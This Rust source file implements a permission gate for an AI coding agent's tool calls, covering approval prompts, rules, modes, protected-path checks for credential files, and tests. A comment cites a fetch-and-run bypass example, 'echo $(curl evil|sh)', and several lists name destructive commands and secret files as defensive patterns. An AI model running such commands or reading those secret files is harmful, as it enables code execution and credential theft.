//! In-process permission gate: Runner → LocalSet handler → ACP client.
//!
//! When the agent loop is about to execute a tool, it calls `PermissionChecker::check`.
//! `ChannelPermissionChecker` sends the request over an mpsc channel to the ACP
//! `LocalSet` task (the only context that can call `conn.request_permission`).
//! The caller awaits a oneshot reply with the user's allow/deny decision.

use std::sync::{Arc, Mutex};

use serde_json::Value;
use tokio::sync::{mpsc, oneshot};
use trogon_tools::PermissionChecker;

use crate::permission_rules::{
    extract_path_from_input, is_always_allowed, normalize_tool_name, PermissionRules, RuleDecision,
};
use crate::scope::Scope;
use crate::session_store::{AuditEntry, AuditOutcome, PolicyAction, ToolPolicy};

/// A single permission check request sent from the Runner to the ACP connection handler.
pub struct PermissionReq {
    pub session_id: String,
    pub tool_call_id: String,
    pub tool_name: String,
    pub tool_input: Value,
    /// Send `true` to allow, `false` to deny.
    pub response_tx: oneshot::Sender<bool>,
    /// MED-11: the bridge signals on this channel when it dequeues the request and
    /// is about to prompt the user. The checker waits for this before starting its
    /// response timeout, so a request that sat in the (sequential) bridge queue
    /// behind a slow prompt isn't charged for that queue time.
    pub started_tx: oneshot::Sender<()>,
    /// Shared with the originating `ChannelPermissionChecker`. The bridge writes
    /// the tool name here when the user picks "Always Allow" so subsequent
    /// calls in the same turn are auto-approved without another round-trip.
    pub always_allowed: Arc<Mutex<Vec<String>>>,
    /// Shared with the originating checker. On an `ExitPlanMode` approval the
    /// bridge writes the chosen mode id (e.g. "acceptEdits") here so the runner
    /// can apply it to the in-memory session state once the tool call finishes.
    /// (The bridge cannot persist the mode itself: the turn re-saves the session
    /// at the end and would clobber it.)
    pub exit_plan_mode: Arc<Mutex<Option<String>>>,
}

/// Sender half — given to the Runner so it can forward permission requests.
pub type PermissionTx = mpsc::Sender<PermissionReq>;

/// Shared buffer for audit entries accumulated during a prompt.
pub type AuditBuf = Arc<Mutex<Vec<AuditEntry>>>;

fn extract_input_summary(tool_name: &str, tool_input: &Value) -> String {
    if let Some(path) = extract_path_from_input(tool_input) {
        return path.to_string();
    }
    if normalize_tool_name(tool_name) == "bash"
        && let Some(cmd) = tool_input.get("command").and_then(|v| v.as_str())
    {
        let prefix: String = cmd.chars().take(60).collect();
        return prefix;
    }
    if tool_name == "gh" {
        let cmd = tool_input
            .get("command")
            .and_then(|v| v.as_str())
            .map(str::to_string)
            .or_else(|| {
                tool_input
                    .get("args")
                    .and_then(|v| v.as_array())
                    .map(|a| {
                        a.iter()
                            .filter_map(|v| v.as_str())
                            .collect::<Vec<_>>()
                            .join(" ")
                    })
            })
            .unwrap_or_default();
        return format!("gh {}", cmd.chars().take(60).collect::<String>());
    }
    tool_name.to_string()
}

fn push_audit(buf: &AuditBuf, tool: &str, input: &Value, outcome: AuditOutcome) {
    let entry = AuditEntry {
        timestamp: crate::session_store::now_iso8601(),
        tool: tool.to_string(),
        input_summary: extract_input_summary(tool, input),
        outcome,
    };
    if let Ok(mut guard) = buf.lock() {
        guard.push(entry);
    }
}

/// `PermissionChecker` implementation that routes requests through an mpsc channel
/// to be handled by the ACP `LocalSet` task (which holds `AgentSideConnection`).
pub struct ChannelPermissionChecker {
    pub session_id: String,
    pub tx: PermissionTx,
    /// Tools for which the user previously chose "Always Allow" — auto-approved.
    /// Shared with the permission bridge so mid-turn "Always Allow" decisions take
    /// effect immediately without waiting for the next turn's store reload.
    pub allowed_tools: Arc<Mutex<Vec<String>>>,
    pub audit_buf: AuditBuf,
    /// Shared cell the bridge writes the chosen mode into on `ExitPlanMode`
    /// approval; read by the runner after the tool call finishes.
    pub exit_plan_mode: Arc<Mutex<Option<String>>>,
}

impl PermissionChecker for ChannelPermissionChecker {
    #[cfg_attr(coverage, coverage(off))]
    fn check<'a>(
        &'a self,
        tool_call_id: &'a str,
        tool_name: &'a str,
        tool_input: &'a Value,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + 'a>> {
        // Auto-allow tools the user has previously approved for this session.
        // Bash commands are checked by binary prefix ("Bash:mkdir") so only that
        // binary is auto-approved, not the entire bash tool.
        if is_always_allowed(&self.allowed_tools.lock().unwrap(), tool_name, tool_input) {
            push_audit(&self.audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
            return Box::pin(async move { true });
        }

        let session_id = self.session_id.clone();
        let tool_call_id = tool_call_id.to_string();
        let tool_name = tool_name.to_string();
        let tool_input = tool_input.clone();
        let tx = self.tx.clone();
        let audit_buf = self.audit_buf.clone();
        let always_allowed = Arc::clone(&self.allowed_tools);
        let exit_plan_mode = Arc::clone(&self.exit_plan_mode);

        Box::pin(async move {
            push_audit(&audit_buf, &tool_name, &tool_input, AuditOutcome::RequiredApproval);
            let (resp_tx, resp_rx) = oneshot::channel();
            let (started_tx, started_rx) = oneshot::channel();
            let req = PermissionReq {
                session_id,
                tool_call_id,
                tool_name: tool_name.clone(),
                tool_input: tool_input.clone(),
                response_tx: resp_tx,
                started_tx,
                always_allowed,
                exit_plan_mode,
            };
            if tx.send(req).await.is_err() {
                push_audit(&audit_buf, &tool_name, &tool_input, AuditOutcome::DeniedByUser);
                // Channel closed — default deny
                return false;
            }
            // MED-11: the bridge is sequential. Wait (generously) for it to dequeue
            // this request and signal `started` before charging the response clock,
            // so a request stuck behind a slow prompt isn't unfairly timed out. If
            // the bridge drops the request without starting (e.g. invalid session),
            // started_rx errors and we fall through to read the denial below.
            const MAX_QUEUE_WAIT: std::time::Duration = std::time::Duration::from_secs(300);
            if tokio::time::timeout(MAX_QUEUE_WAIT, started_rx).await.is_err() {
                // Bridge never started this request within the queue window — deny.
                push_audit(&audit_buf, &tool_name, &tool_input, AuditOutcome::DeniedByUser);
                return false;
            }
            // Now the user is actually being prompted. The prompt blocks on the human,
            // so there is no response timeout — wait until the user answers (the bridge
            // resolves `resp_rx`) or the bridge drops the channel (treated as deny).
            match resp_rx.await {
                Ok(true) => {
                    push_audit(&audit_buf, &tool_name, &tool_input, AuditOutcome::ApprovedByUser);
                    true
                }
                _ => {
                    push_audit(&audit_buf, &tool_name, &tool_input, AuditOutcome::DeniedByUser);
                    false
                }
            }
        })
    }
}

/// Evaluate `tool_policies` for the given tool name and path.
///
/// Evaluation order: Deny beats Allow beats RequireApproval. Returns `None`
/// when no policy matches (caller should fall through to interactive ask).
fn eval_tool_policies(
    policies: &[ToolPolicy],
    tool_name: &str,
    tool_input: &Value,
) -> Option<PolicyAction> {
    let normalized = normalize_tool_name(tool_name);
    // MED-10: bash calls carry no path/file_path/notebook_path, so matching an
    // empty string made every path-scoped policy silently ineffective for bash.
    // Fall back to the command text so policy globs can match bash commands.
    let path = extract_path_from_input(tool_input)
        .or_else(|| {
            if normalized == "bash" {
                tool_input.get("command").and_then(|v| v.as_str())
            } else {
                None
            }
        })
        .unwrap_or("");

    let matching: Vec<&PolicyAction> = policies
        .iter()
        // B14: normalize BOTH sides so a policy authored as `tool: "Bash"` matches
        // an incoming `bash` (and vice-versa), not just exact / one-sided matches.
        .filter(|p| normalize_tool_name(&p.tool) == normalized)
        .filter(|p| {
            globset::Glob::new(&p.path_pattern)
                .ok()
                .map(|g| g.compile_matcher().is_match(path))
                .unwrap_or(false)
        })
        .map(|p| &p.action)
        .collect();

    if matching.is_empty() {
        return None;
    }
    if matching.iter().any(|a| matches!(a, PolicyAction::Deny)) {
        return Some(PolicyAction::Deny);
    }
    if matching.iter().any(|a| matches!(a, PolicyAction::Allow)) {
        return Some(PolicyAction::Allow);
    }
    Some(PolicyAction::RequireApproval)
}

/// `PermissionChecker` that first evaluates static [`PermissionRules`] before
/// forwarding to the interactive [`ChannelPermissionChecker`].
///
/// - `Deny` → rejects immediately (no UI prompt).
/// - `Allow` → approves immediately (no UI prompt).
/// - `Ask` → falls through to the channel checker for interactive approval.
pub struct RulesPermissionChecker {
    pub rules: Arc<PermissionRules>,
    pub tool_policies: Vec<ToolPolicy>,
    pub inner: ChannelPermissionChecker,
}

impl PermissionChecker for RulesPermissionChecker {
    fn check<'a>(
        &'a self,
        tool_call_id: &'a str,
        tool_name: &'a str,
        tool_input: &'a Value,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + 'a>> {
        match self.rules.check(tool_name, tool_input) {
            RuleDecision::Deny => {
                push_audit(&self.inner.audit_buf, tool_name, tool_input, AuditOutcome::Denied);
                return Box::pin(async move { false });
            }
            RuleDecision::Allow => {
                push_audit(&self.inner.audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
                return Box::pin(async move { true });
            }
            RuleDecision::Ask => {}
        }

        match eval_tool_policies(&self.tool_policies, tool_name, tool_input) {
            Some(PolicyAction::Deny) => {
                push_audit(&self.inner.audit_buf, tool_name, tool_input, AuditOutcome::Denied);
                Box::pin(async move { false })
            }
            Some(PolicyAction::Allow) => {
                push_audit(&self.inner.audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
                Box::pin(async move { true })
            }
            Some(PolicyAction::RequireApproval) | None => {
                self.inner.check(tool_call_id, tool_name, tool_input)
            }
        }
    }
}

/// Read-only tools auto-allowed in `default` mode (Claude Code parity — no prompt for reads).
const READ_ONLY_TOOLS: &[&str] = &[
    "read_file",
    "glob",
    "list_dir",
    "grep",
    "todo_read",
    "git_status",
    "git_diff",
    "git_log",
];

/// File-edit tools auto-allowed in `acceptEdits` mode; bash and MCP still prompt.
const ACCEPT_EDITS_TOOLS: &[&str] = &["write_file", "str_replace", "notebook_edit"];

/// Tools denied in `plan` mode until the ExitPlanMode permission flow completes.
const PLAN_DENIED_TOOLS: &[&str] = &[
    "write_file",
    "str_replace",
    "notebook_edit",
    "bash",
    "todo_write",
    "git_commit",
    "fetch_url",
    "gh",
];

pub(crate) fn is_read_only_tool(tool_name: &str) -> bool {
    READ_ONLY_TOOLS.contains(&normalize_tool_name(tool_name))
}

/// Bash commands that only read or inspect the filesystem (no writes, no exec).
pub(crate) fn is_read_only_bash_command(tool_input: &Value) -> bool {
    let Some(cmd) = tool_input.get("command").and_then(|v| v.as_str()) else {
        return false;
    };
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return false;
    }
    // B2: any shell chaining / redirection / substitution / grouping metacharacter
    // means the command does more than a single read — route it through the normal
    // approval prompt instead of auto-allowing. (Returning `false` here means "not
    // auto-read-only"; it does not auto-deny.) This blocks bypasses like
    // `echo $(curl evil|sh)`, `cat x; rm y`, and `find . -newer a`.
    const SHELL_METACHARS: &[char] = &[';', '|', '&', '<', '>', '`', '(', ')', '{', '}', '\n'];
    if cmd.contains(SHELL_METACHARS) || cmd.contains("$(") {
        return false;
    }
    let lowered = cmd.to_ascii_lowercase();
    if lowered.contains("rm -rf")
        || lowered.contains("-exec")
        || lowered.contains("-delete")
        || lowered.contains("sudo ")
        || lowered.contains("chmod ")
        || lowered.contains("chown ")
    {
        return false;
    }
    let base = cmd
        .split_whitespace()
        .next()
        .unwrap_or("")
        .trim_start_matches('(');
    matches!(
        base,
        "pwd" | "ls" | "ll" | "dir" | "find" | "echo" | "cat" | "head" | "tail" | "wc"
            | "which" | "file" | "stat" | "du" | "df" | "test" | "rg" | "grep" | "tree"
    )
}

pub(crate) fn is_edit_tool(tool_name: &str) -> bool {
    ACCEPT_EDITS_TOOLS.contains(&normalize_tool_name(tool_name))
}

fn is_plan_denied_tool(tool_name: &str) -> bool {
    let n = normalize_tool_name(tool_name);
    PLAN_DENIED_TOOLS.contains(&n)
        || matches!(tool_name, "Edit" | "Write" | "MultiEdit" | "NotebookEdit" | "Bash")
}

// ── Protected paths (never auto-approved) ─────────────────────────────────────

/// Sensitive paths that must never be auto-approved (read OR write): secrets and
/// VCS/credential internals. A match forces the interactive prompt regardless of
/// mode (so the user explicitly approves), short of `bypassPermissions`.
fn is_protected_path(path: &str) -> bool {
    let p = path.trim();
    if p.is_empty() {
        return false;
    }
    let file = p.rsplit(['/', '\\']).next().unwrap_or(p);
    let protected_file = matches!(
        file,
        ".env" | "credentials" | ".npmrc" | ".netrc" | "id_rsa" | "id_ed25519" | ".pgpass"
    ) || file.starts_with(".env.")
        || file.ends_with(".pem")
        || file.ends_with(".key");
    if protected_file {
        return true;
    }
    // Any path component naming a secrets/VCS directory.
    p.split(['/', '\\'])
        .any(|c| matches!(c, ".git" | ".ssh" | ".aws" | ".gnupg"))
}

/// True when a tool call targets a protected path: an explicit path argument, or
/// a (read-only) bash command that references one (e.g. `cat .env`).
pub(crate) fn touches_protected_path(tool_name: &str, tool_input: &Value) -> bool {
    if extract_path_from_input(tool_input)
        .map(is_protected_path)
        .unwrap_or(false)
    {
        return true;
    }
    normalize_tool_name(tool_name) == "bash"
        && tool_input
            .get("command")
            .and_then(|v| v.as_str())
            .map(|cmd| cmd.split_whitespace().any(is_protected_path))
            .unwrap_or(false)
}

// ── Read containment ──────────────────────────────────────────────────────────

/// Lexically resolve `p` (relative to `base`) to a normalized absolute path,
/// collapsing `.`/`..` WITHOUT touching the filesystem.
pub(crate) fn lexical_abs(base: &str, p: &str) -> std::path::PathBuf {
    use std::path::{Component, Path, PathBuf};
    let raw = if Path::new(p).is_absolute() {
        PathBuf::from(p)
    } else {
        Path::new(base).join(p)
    };
    let mut out = PathBuf::new();
    for comp in raw.components() {
        match comp {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            c => out.push(c.as_os_str()),
        }
    }
    out
}

// ── Safety classifier (auto mode) ─────────────────────────────────────────────

/// Verdict from the `auto`-mode safety classifier for a side-effecting tool call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClassifierVerdict {
    Allow,
    Prompt,
    Deny,
}

/// Classifies whether a tool call is safe to auto-approve in `auto` mode. The
/// production implementation asks an LLM; tests inject a mock. Read-only and
/// protected-path calls are decided before the classifier is consulted.
pub trait SafetyClassifier: Send + Sync {
    fn classify<'a>(
        &'a self,
        tool_name: &'a str,
        tool_input: &'a Value,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ClassifierVerdict> + Send + 'a>>;
}

/// Optional extra configuration for [`build_mode_permission_checker`].
#[derive(Default, Clone)]
pub struct PermissionExtras {
    /// Session cwd. When set, read-only auto-allow is contained to `cwd` +
    /// `additional_read_dirs` (reads elsewhere prompt). `None` disables containment.
    pub cwd: Option<String>,
    /// Directories where reads are auto-allowed beyond `cwd` (`--add-dir` roots +
    /// `permissions.additionalDirectories`).
    pub additional_read_dirs: Vec<String>,
    /// `auto`-mode classifier. `None` makes `auto` prompt for side-effecting tools.
    pub classifier: Option<Arc<dyn SafetyClassifier>>,
    /// PreToolUse hook matchers run before each tool (a blocking hook denies it).
    pub pre_tool_use: Vec<crate::hooks::HookMatcher>,
}

/// Applies session permission mode policy before delegating to [`RulesPermissionChecker`].
///
/// An explicit `Deny` (TROGON.md rule or tool-policy) is a hard boundary and wins
/// over every mode auto-allow below (including `dontAsk`). `bypassPermissions` is
/// the only escape — it installs no checker at all.
///
/// | Mode | Behavior |
/// |------|----------|
/// | `default` | Auto-allow read-only tools + read-only bash; TROGON.md rules + prompt for write-bash, edits, MCP |
/// | `acceptEdits` | Auto-allow read-only tools + read-only bash + file edits; prompt write-bash, MCP, other tools |
/// | `dontAsk` | Auto-allow all except explicit Deny rules/policies (audit) |
/// | `plan` | Auto-allow read-only tools + read-only bash; deny write tools + write-bash |
/// | `auto` | Auto-allow read-only; side-effecting tools decided by an LLM safety classifier (Allow/Prompt/Deny) |
/// | `bypassPermissions` | Not installed — caller skips checker entirely (ignores Deny rules too) |
///
/// Two cross-cutting rules apply in every installed mode (i.e. not `bypassPermissions`):
/// - **Protected paths** (`.env*`, `.git/`, `.ssh/`, keys, …) are never auto-approved — they force the prompt.
/// - **Read containment**: when a cwd is configured, read-only auto-allow is limited to the cwd plus
///   `additional_read_dirs` (`--add-dir` + `permissions.additionalDirectories`); reads elsewhere prompt.
pub struct ModePermissionChecker {
    pub mode: String,
    pub inner: RulesPermissionChecker,
    /// Session cwd for read containment; `None` disables containment.
    pub cwd: Option<String>,
    /// Extra dirs where reads are auto-allowed (beyond cwd).
    pub read_dirs: Vec<String>,
    /// `auto`-mode safety classifier.
    pub classifier: Option<Arc<dyn SafetyClassifier>>,
    /// PreToolUse hook matchers; a blocking hook denies the tool.
    pub pre_tool_use: Vec<crate::hooks::HookMatcher>,
    /// Optional Scope envelope for the low-friction permission model (Phase 2).
    /// When `Some`, it governs the decision before the mode match; `None` uses
    /// the legacy mode logic. Resolved in the builder (SCOPE-7), consulted in
    /// `check` (SCOPE-8).
    pub scope: Option<Scope>,
}

impl ModePermissionChecker {
    /// An explicit `Deny` from TROGON.md rules or tool-policies is a hard boundary
    /// that must win over any mode auto-allow (including `dontAsk`).
    fn explicitly_denied(&self, tool_name: &str, tool_input: &Value) -> bool {
        matches!(self.inner.rules.check(tool_name, tool_input), RuleDecision::Deny)
            || matches!(
                eval_tool_policies(&self.inner.tool_policies, tool_name, tool_input),
                Some(PolicyAction::Deny)
            )
    }

    /// Whether a read-only tool's path is within the allowed read roots (cwd +
    /// `read_dirs`). Returns `true` when containment is disabled (`cwd` is `None`)
    /// or the tool has no path argument.
    fn read_allowed(&self, tool_input: &Value) -> bool {
        let Some(cwd) = self.cwd.as_deref() else {
            return true;
        };
        let Some(path) = extract_path_from_input(tool_input) else {
            return true;
        };
        Self::path_within_read_roots(cwd, path, &self.read_dirs)
    }

    /// Whether a read-only bash command only touches paths within the allowed read
    /// roots. Returns `true` when containment is disabled (`cwd` is `None`). When
    /// cwd is set, only auto-allows if every identifiable path argument is
    /// contained; unparsable commands fail closed (prompt).
    fn read_only_bash_allowed(&self, tool_input: &Value) -> bool {
        let Some(cwd) = self.cwd.as_deref() else {
            return true;
        };
        let Some(cmd) = tool_input.get("command").and_then(|v| v.as_str()) else {
            return false;
        };
        let Some(path_args) = extract_read_only_bash_paths(cmd) else {
            return false;
        };
        if path_args.is_empty() {
            return true;
        }
        path_args
            .iter()
            .all(|path| Self::path_within_read_roots(cwd, path, &self.read_dirs))
    }

    fn path_within_read_roots(cwd: &str, path: &str, read_dirs: &[String]) -> bool {
        let target = lexical_abs(cwd, path);
        std::iter::once(lexical_abs(cwd, "."))
            .chain(read_dirs.iter().map(|d| lexical_abs(cwd, d)))
            .any(|root| target.starts_with(&root))
    }
}

/// Skip leading flag tokens (`-l`, `--all`, `-n 10`, …) and return the remainder.
fn skip_bash_flag_tokens<'a, 'b>(args: &'b [&'a str]) -> &'b [&'a str] {
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if a == "--" {
            return &args[i + 1..];
        }
        if !a.starts_with('-') {
            break;
        }
        if a.contains('=') {
            i += 1;
            continue;
        }
        if a.len() > 1
            && !a.starts_with("--")
            && a.chars().skip(1).all(|c| c.is_ascii_alphabetic())
        {
            i += 1;
            continue;
        }
        i += 1;
        if i < args.len() && !args[i].starts_with('-') {
            i += 1;
        }
    }
    &args[i..]
}

/// Collect non-flag arguments that refer to filesystem paths.
fn collect_bash_path_args<'a>(args: &[&'a str]) -> Vec<&'a str> {
    let mut paths = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if a == "--" {
            paths.extend(&args[i + 1..]);
            break;
        }
        if a.starts_with('-') {
            if a.contains('=') {
                i += 1;
                continue;
            }
            if a.len() > 1
                && !a.starts_with("--")
                && a.chars().skip(1).all(|c| c.is_ascii_alphabetic())
            {
                i += 1;
                continue;
            }
            i += 1;
            if i < args.len() && !args[i].starts_with('-') {
                i += 1;
            }
            continue;
        }
        paths.push(a);
        i += 1;
    }
    paths
}

/// Path arguments from a read-only bash command. `None` when the command cannot
/// be parsed reliably (caller should prompt).
fn extract_read_only_bash_paths(cmd: &str) -> Option<Vec<&str>> {
    let tokens: Vec<&str> = cmd.split_whitespace().collect();
    if tokens.is_empty() {
        return None;
    }
    let base = tokens[0].trim_start_matches('(');
    match base {
        "pwd" | "df" | "echo" | "which" => Some(vec![]),
        "ls" | "ll" | "dir" | "cat" | "head" | "tail" | "wc" | "file" | "stat" | "du" | "tree" => {
            Some(collect_bash_path_args(&tokens[1..]))
        }
        "find" => {
            // `find` can execute commands or write/delete via these actions —
            // it is not read-only when any are present, so fail closed (prompt).
            const FIND_UNSAFE: &[&str] = &[
                "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprintf",
                "-fprintf0", "-fls",
            ];
            if tokens[1..].iter().any(|t| FIND_UNSAFE.contains(t)) {
                return None;
            }
            // Leading operands (before the first predicate/option) are the search
            // roots; check every one, not just the first. No roots = searches cwd.
            Some(
                tokens[1..]
                    .iter()
                    .take_while(|t| !t.starts_with('-'))
                    .copied()
                    .collect(),
            )
        }
        "grep" | "rg" => {
            // `-f/--file` reads a patterns FILE we wouldn't containment-check, and
            // `-e/--regexp` supplies the pattern via flag (so the first positional
            // is a path, not the pattern). Both break the parse below — fail closed.
            if tokens[1..].iter().any(|t| {
                matches!(*t, "-f" | "--file" | "-e" | "--regexp")
                    || t.starts_with("--file=")
                    || t.starts_with("--regexp=")
            }) {
                return None;
            }
            let rest = skip_bash_flag_tokens(&tokens[1..]);
            if rest.is_empty() {
                Some(vec![])
            } else {
                Some(rest[1..].to_vec())
            }
        }
        "test" | "[" => None,
        _ => None,
    }
}

impl PermissionChecker for ModePermissionChecker {
    fn check<'a>(
        &'a self,
        tool_call_id: &'a str,
        tool_name: &'a str,
        tool_input: &'a Value,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + 'a>> {
        let audit_buf = self.inner.inner.audit_buf.clone();

        // Deny always wins, regardless of mode. Checked before any mode auto-allow
        // fast path so an explicit Deny rule/policy can't be bypassed by `dontAsk`,
        // `acceptEdits` (edits), or the read-only auto-allows.
        if self.explicitly_denied(tool_name, tool_input) {
            push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Denied);
            return Box::pin(async move { false });
        }

        // Everything else runs in one async block so PreToolUse hooks can run
        // (and potentially block) before the mode decision.
        Box::pin(async move {
            // PreToolUse hooks: a blocking hook denies the tool before it runs.
            if !self.pre_tool_use.is_empty() {
                let payload = serde_json::json!({
                    "hook_event_name": "PreToolUse",
                    "tool_name": tool_name,
                    "tool_input": tool_input,
                });
                if let crate::hooks::HookOutcome::Block { reason } =
                    crate::hooks::run_event_hooks(&self.pre_tool_use, Some(tool_name), &payload).await
                {
                    eprintln!("PreToolUse hook blocked `{tool_name}`: {reason}");
                    push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Denied);
                    return false;
                }
            }

            // Protected paths (.env*, .git/, keys, …) are NEVER auto-approved: force
            // the interactive prompt, skipping mode + rule auto-allow.
            if touches_protected_path(tool_name, tool_input) {
                return self.inner.inner.check(tool_call_id, tool_name, tool_input).await;
            }

            // CFG-3: an explicit `ask` rule (settings.json `permissions.ask`) forces the
            // interactive prompt, skipping mode + read-only auto-allow. Deny still wins
            // (handled above); bypassPermissions never reaches here.
            if self.inner.rules.explicitly_asks(tool_name, tool_input) {
                return self.inner.inner.check(tool_call_id, tool_name, tool_input).await;
            }

            match self.mode.as_str() {
                "dontAsk" => {
                    push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
                    true
                }
                // Read-only tools auto-allow in default/acceptEdits/plan/auto, but only
                // within the allowed read roots (cwd + additional_read_dirs); reads
                // elsewhere prompt.
                "default" | "acceptEdits" | "plan" | "auto" if is_read_only_tool(tool_name) => {
                    if self.read_allowed(tool_input) {
                        push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
                        true
                    } else {
                        self.inner.inner.check(tool_call_id, tool_name, tool_input).await
                    }
                }
                "default" | "acceptEdits" | "plan" | "auto"
                    if normalize_tool_name(tool_name) == "bash"
                        && is_read_only_bash_command(tool_input) =>
                {
                    if self.read_only_bash_allowed(tool_input) {
                        push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
                        true
                    } else {
                        self.inner.inner.check(tool_call_id, tool_name, tool_input).await
                    }
                }
                "acceptEdits" if is_edit_tool(tool_name) => {
                    push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
                    true
                }
                // Write/side-effect tools (and write-bash) are denied in plan mode.
                "plan" if is_plan_denied_tool(tool_name) => {
                    push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Denied);
                    false
                }
                // `auto`: side-effecting tool — let the LLM safety classifier decide.
                // No classifier → fall back to the interactive prompt (fail safe).
                "auto" => match &self.classifier {
                    Some(classifier) => match classifier.classify(tool_name, tool_input).await {
                        ClassifierVerdict::Allow => {
                            push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Allowed);
                            true
                        }
                        ClassifierVerdict::Deny => {
                            push_audit(&audit_buf, tool_name, tool_input, AuditOutcome::Denied);
                            false
                        }
                        ClassifierVerdict::Prompt => {
                            self.inner.inner.check(tool_call_id, tool_name, tool_input).await
                        }
                    },
                    None => self.inner.check(tool_call_id, tool_name, tool_input).await,
                },
                _ => self.inner.check(tool_call_id, tool_name, tool_input).await,
            }
        })
    }
}

/// Build a mode-aware permission checker, or `None` when mode is `bypassPermissions`.
#[allow(clippy::too_many_arguments)]
pub fn build_mode_permission_checker(
    mode: &str,
    session_id: &str,
    perm_tx: &PermissionTx,
    allowed_tools: Vec<String>,
    rules: Arc<PermissionRules>,
    tool_policies: Vec<ToolPolicy>,
    audit_buf: AuditBuf,
    exit_plan_mode: Arc<Mutex<Option<String>>>,
    extras: PermissionExtras,
) -> Option<Arc<dyn PermissionChecker>> {
    if mode == "bypassPermissions" {
        return None;
    }
    let inner = ChannelPermissionChecker {
        session_id: session_id.to_string(),
        tx: perm_tx.clone(),
        allowed_tools: Arc::new(Mutex::new(allowed_tools)),
        audit_buf,
        exit_plan_mode,
    };
    let rules_checker = RulesPermissionChecker {
        rules,
        tool_policies,
        inner,
    };
    Some(Arc::new(ModePermissionChecker {
        mode: mode.to_string(),
        inner: rules_checker,
        cwd: extras.cwd,
        read_dirs: extras.additional_read_dirs,
        classifier: extras.classifier,
        pre_tool_use: extras.pre_tool_use,
        scope: None, // resolved in SCOPE-7
    }))
}

/// Gate a single tool invocation using session mode, rules, and optional NATS permission channel.
/// Returns `true` when the tool may run; `false` when denied.
#[allow(clippy::too_many_arguments)]
pub async fn check_tool_permission(
    mode: &str,
    session_id: &str,
    perm_tx: Option<&PermissionTx>,
    allowed_tools: &[String],
    rules: PermissionRules,
    tool_policies: &[ToolPolicy],
    tool_call_id: &str,
    tool_name: &str,
    tool_input: &Value,
    // MED-7: caller-owned audit buffer. Previously a fresh buffer was allocated
    // here and dropped immediately, so xai/openrouter session audit logs were
    // always empty. The caller passes a turn-scoped buffer and drains it into the
    // session's audit_log after the turn.
    audit_buf: AuditBuf,
    extras: PermissionExtras,
) -> bool {
    if mode == "bypassPermissions" {
        return true;
    }
    let Some(tx) = perm_tx else {
        return true;
    };
    let Some(checker) = build_mode_permission_checker(
        mode,
        session_id,
        tx,
        allowed_tools.to_vec(),
        Arc::new(rules),
        tool_policies.to_vec(),
        audit_buf,
        // One-shot gate (xai/openrouter): no ExitPlanMode handling, so a throwaway cell.
        Arc::new(Mutex::new(None)),
        extras,
    ) else {
        return true;
    };
    checker
        .check(tool_call_id, tool_name, tool_input)
        .await
}

#[cfg(test)]
mod tests {
    use super::*;
    use trogon_tools::PermissionChecker;

    fn make_checker(tx: PermissionTx, allowed_tools: Vec<String>) -> ChannelPermissionChecker {
        ChannelPermissionChecker {
            session_id: "sess-1".to_string(),
            tx,
            allowed_tools: Arc::new(Mutex::new(allowed_tools)),
            audit_buf: Arc::new(Mutex::new(vec![])),
            exit_plan_mode: Arc::new(Mutex::new(None)),
        }
    }

    fn make_checker_with_buf(
        tx: PermissionTx,
        allowed_tools: Vec<String>,
        buf: AuditBuf,
    ) -> ChannelPermissionChecker {
        ChannelPermissionChecker {
            session_id: "sess-1".to_string(),
            tx,
            allowed_tools: Arc::new(Mutex::new(allowed_tools)),
            audit_buf: buf,
            exit_plan_mode: Arc::new(Mutex::new(None)),
        }
    }

    #[tokio::test]
    async fn auto_allows_tool_in_allowed_list() {
        let (tx, _rx) = mpsc::channel(1);
        let checker = make_checker(tx, vec!["Bash".to_string()]);
        let result = checker
            .check("tc-1", "Bash", &serde_json::Value::Null)
            .await;
        assert!(result, "Bash should be auto-allowed");
    }

    #[tokio::test]
    async fn auto_allows_normalizes_tool_name() {
        // "Bash" in the allowed list must match the "bash" invocation after normalization.
        let (tx, _rx) = mpsc::channel(1);
        let checker = make_checker(tx, vec!["Bash".to_string()]);
        let result = checker
            .check("tc-1", "bash", &serde_json::Value::Null)
            .await;
        assert!(result, "normalized bash should be auto-allowed via Bash entry");
    }

    #[tokio::test]
    async fn channel_allow_returns_true() {
        let (tx, mut rx) = mpsc::channel(1);
        let checker = make_checker(tx, vec![]);
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(true);
            }
        });
        let result = checker
            .check("tc-2", "Edit", &serde_json::Value::Null)
            .await;
        assert!(result, "channel returned allow");
    }

    #[tokio::test]
    async fn channel_deny_returns_false() {
        let (tx, mut rx) = mpsc::channel(1);
        let checker = make_checker(tx, vec![]);
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(false);
            }
        });
        let result = checker
            .check("tc-3", "Write", &serde_json::Value::Null)
            .await;
        assert!(!result, "channel returned deny");
    }

    #[tokio::test]
    async fn closed_channel_returns_false() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx); // close the receiver
        let checker = make_checker(tx, vec![]);
        let result = checker
            .check("tc-4", "Read", &serde_json::Value::Null)
            .await;
        assert!(!result, "closed channel should default to deny");
    }

    #[cfg_attr(coverage, coverage(off))]
    #[tokio::test]
    async fn permission_req_carries_correct_fields() {
        let (tx, mut rx) = mpsc::channel(1);
        let checker = make_checker(tx, vec![]);
